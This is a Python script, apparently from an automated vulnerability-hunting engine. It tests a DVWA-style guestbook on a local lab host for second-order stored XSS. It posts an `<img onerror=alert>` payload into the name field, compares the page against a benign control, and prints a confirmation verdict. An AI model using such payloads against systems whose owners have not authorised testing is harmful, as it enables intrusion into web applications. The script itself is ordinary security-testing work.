#!/usr/bin/env python3
"""explore_secondorder.py — NEW PROCESS (brain-explore-v1, 29 Oct ~19:57 IST).

WHY THIS PROCESS EXISTS (reason, owner refinement #1): the playbook's stored
XSS probe used the mtxMessage field only. A real elite hunter's next thought
is: "the payload persisted — does it reach OTHER sinks/contexts?" This
process poisons the txtName field (a different sink in the same guestbook)
and verifies reflection of BOTH fields — a second-order variant the
playbook never tried.

Self-contained: fixed marker argv[1], control (benign name reflects safely),
fixed VERDICT line LAST (engine VERDICT_RE).
"""
import sys
import urllib.parse
import urllib.request

MARKER = sys.argv[1] if len(sys.argv) > 1 else "2ORD7719-EXP2"
BASE = "http://172.17.0.1:3100"
TIMEOUT = 25
PATH = "/vulnerabilities/xss_s/"

PAYLOAD = "<img src=x onerror=alert('%s')>" % MARKER
# NOTE (bug fixed 29 Oct ~20:00 IST): the benign control value must NOT
# contain the marker — an earlier version used "benign-name-<MARKER>", which
# made the control's marker-absence check fail by construction and forced a
# false FAILED verdict against a vulnerable target.
BENIGN = "benign-control-name-plain"


def post(fields):
    data = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(BASE + PATH, data=data, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return r.read().decode("utf-8", "replace")
    except Exception as e:
        return f"TRANSPORT_ERROR: {e}"


def get():
    try:
        with urllib.request.urlopen(BASE + PATH, timeout=TIMEOUT) as r:
            return r.read().decode("utf-8", "replace")
    except Exception as e:
        return f"TRANSPORT_ERROR: {e}"


print("SECONDORDER-EXPLORE-START marker=%s" % MARKER)

# CONTROL: benign name must reflect (page works) and must NOT contain our
# payload marker (the marker travels only via the poisoned field).
post({"txtName": BENIGN, "mtxMessage": "control message", "btnSign": "Sign Guestbook"})
ctrl_page = get()
ctrl_ok = BENIGN in ctrl_page and MARKER not in ctrl_page
print("CONTROL benign-reflects=%s marker-absent=%s" % (BENIGN in ctrl_page,
                                                      MARKER not in ctrl_page))

# POISON: payload in the txtName field (NOT mtxMessage — the playbook's field).
post({"txtName": PAYLOAD, "mtxMessage": "second order explore", "btnSign": "Sign Guestbook"})
page = get()

name_hit = PAYLOAD in page
msg_field_clean_note = "mtxMessage field carries no payload this time by design"
print("POISON txtName payload reflected=%s" % name_hit)
print("NOTE %s" % msg_field_clean_note)

if ctrl_ok and name_hit:
    print("EVIDENCE: payload '%s' submitted ONLY via txtName is stored and "
          "reflected verbatim in the guestbook (Name field), outside the "
          "playbook's mtxMessage sink — second-order stored XSS variant."
          % PAYLOAD)
    print("VERDICT: CONFIRMED")
else:
    print("REASON: control-ok=%s name-reflected=%s — the txtName sink did "
          "not reflect the payload; no second-order variant here." % (ctrl_ok, name_hit))
    print("VERDICT: FAILED")
